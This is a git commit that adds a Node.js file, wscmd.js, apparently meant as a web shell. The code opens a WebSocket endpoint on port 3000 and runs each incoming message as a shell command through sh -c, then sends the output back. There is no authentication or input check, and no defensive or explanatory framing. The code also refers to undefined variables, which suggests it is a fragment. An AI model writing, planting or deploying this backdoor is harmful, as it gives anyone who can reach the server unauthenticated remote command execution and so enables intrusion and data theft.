3004fccb97689bb0aadd4aca6679a7a15b69c353
veo <38176360+veo@users.noreply.github.com>
2022-07-27 23:56:31 +0800

    nodejs

---
+++ Nodejs/wscmd.js
@@ -0,0 +1,34 @@
+const server = http.createServer(app);
+var WebSocket = require('faye-websocket');
+
+
+server.on('upgrade', function(request, socket, body) {
+	if (WebSocket.isWebSocket(request)) {
+	  	var ws = new WebSocket(request, socket, body);
+		ws.on("message", function(event) {
+            const spawn = require('child_process').spawn;
+            const cmd = spawn('sh', ['-c', event.data]);
+            var result = "";
+            cmd.stdout.on('data', (data) => {
+                result += data;
+            });
+            cmd.on('close', (code) => {
+                ws.send(result);
+            })
+		});
+		ws.on('close', function (code, reason) {
+			// logger.warn('websocket client disconnected: ' + code + ' [' + reason + ']');
+			if (tc != null) {
+				tc.end();
+			}
+		});
+		ws.on('error', function (a) {
+			// logger.warn('websocket client error: ' + a);
+			if (tc != null) {
+				tc.end();
+			}
+		});
+	}
+});
+
+server.listen(3000)
